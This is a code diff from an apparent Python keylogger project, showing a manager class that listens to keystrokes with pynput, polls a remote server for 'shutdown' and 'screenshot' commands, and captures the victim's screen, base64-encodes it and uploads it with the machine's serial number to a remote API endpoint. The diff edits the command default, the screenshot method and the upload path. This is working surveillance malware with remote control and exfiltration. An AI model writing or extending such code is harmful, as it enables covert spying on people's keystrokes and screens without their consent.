@@ -1,3 +1,4 @@
+
 from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
@@ -52,7 +53,7 @@ class KeyLoggerManager(IKeyLoggerManager):
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
                         self.stop_logging()
-                    if commands.get('screenshot', True):
+                    if commands.get('screenshot', False):
                         self.take_screenshot()
 
             except requests.exceptions.RequestException:
@@ -68,21 +69,20 @@ class KeyLoggerManager(IKeyLoggerManager):
             print(value)
 
     def take_screenshot(self):
-            try:
-                screenshot = pyautogui.screenshot()
-                img_byte_arr = io.BytesIO()
-                screenshot.save(img_byte_arr, format='PNG')
-                img_bytes = img_byte_arr.getvalue()
-                encoded_img = base64.b64encode(img_bytes).decode('utf-8')
+        try:
+            screenshot = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            img_bytes = img_byte_arr.getvalue()
+            encoded_img = base64.b64encode(img_bytes).decode('utf-8')
+            data = {
+                "machine": str(self.__serial_number),
+                "screenshot": encoded_img,
+            }
 
-                data = {
-                    "machine": str(self.__serial_number),
-                    "screenshot": encoded_img,
-                }
+            response = requests.post(URL + '/api/upload_screenshot', json=data)
+            return response.status_code == 200
 
-                response = requests.post(URL + f'/api/screenshot/{self.__serial_number}', json=data)
-
-                return response.status_code == 200
-            except Exception as e:
-                print(f"Error taking screenshot: {e}")
-                return False
+        except Exception as e:
+            print(f"Screenshot error: {str(e)}")
+            return False
